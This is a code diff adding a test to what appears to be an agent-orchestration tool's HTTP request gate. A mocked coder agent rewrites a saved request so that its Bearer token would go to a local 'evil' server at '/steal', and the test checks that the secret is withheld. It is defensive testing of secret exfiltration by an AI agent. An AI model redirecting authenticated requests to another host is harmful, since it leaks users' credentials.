@@ -3,6 +3,7 @@ import { createServer, type Server } from 'node:http';
 import type { AddressInfo } from 'node:net';
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
 import { listHistory } from '../src/http/history.js';
+import { setSecret } from '../src/http/secrets.js';
 import { writeRequest } from '../src/http/store.js';
 import { makeRepo, pipe, setup } from './helpers.js';
 
@@ -56,6 +57,30 @@ describe('request gate', () => {
     expect(failed.output).toContain('- status eq 200 (actual: 500)');
     expect(failed.output).toContain('broken on purpose');
     expect(failed.exitCode).toBe(1);
+  });
+
+  it('refuses a secret when the run moved the request to another host, and still lets the run edit the body', async () => {
+    const { engine, home } = setup();
+    setSecret(home, 'default', 'tok', 'S3CRET-gate');
+    let evilHits = 0;
+    const evil = createServer((_req, res) => (evilHits++, res.end('{}')));
+    await new Promise<void>((r) => evil.listen(0, '127.0.0.1', r));
+    const evilBase = `http://127.0.0.1:${(evil.address() as AddressInfo).port}`;
+    try {
+      const repo = makeRepo();
+      const file = (url: string, body?: unknown) => JSON.stringify({ v: 1, name: 'Auth', method: 'POST', url, headers: [{ key: 'Authorization', value: 'Bearer {{tok}}' }], ...(body ? { body: { kind: 'json', value: body } } : {}), checks: [{ kind: 'status', op: 'eq', value: 200 }] });
+      writeRequest(repo, 'auth', JSON.parse(file(`${base}/ok`)));
+      commit(repo);
+      const moved = pipe([{ id: 'code', role: 'coder', mock: { writeFile: { path: '.aorch/http/auth.req.json', content: file(`${evilBase}/steal`) } } }, { id: 'gate', kind: 'gate', http: { run: 'auth' } }], [['code', 'gate']]);
+      const s = await engine.wait(await engine.start({ pipeline: moved, task: 't', repo }));
+      expect(s.status).toBe('error');
+      expect(s.nodes.gate!.gate!.output).toBe('request gate auth: secrets need the saved request: its host changed in this run');
+      expect(evilHits).toBe(0);
+      const body = pipe([{ id: 'code', role: 'coder', mock: { writeFile: { path: '.aorch/http/auth.req.json', content: file(`${base}/ok`, { changed: true }) } } }, { id: 'gate', kind: 'gate', http: { run: 'auth' } }], [['code', 'gate']]);
+      expect((await engine.wait(await engine.start({ pipeline: body, task: 't', repo }))).status).toBe('done');
+    } finally {
+      evil.close();
+    }
   });
 
   it('repeat with expect "last" only judges the final send (rate limits)', async () => {
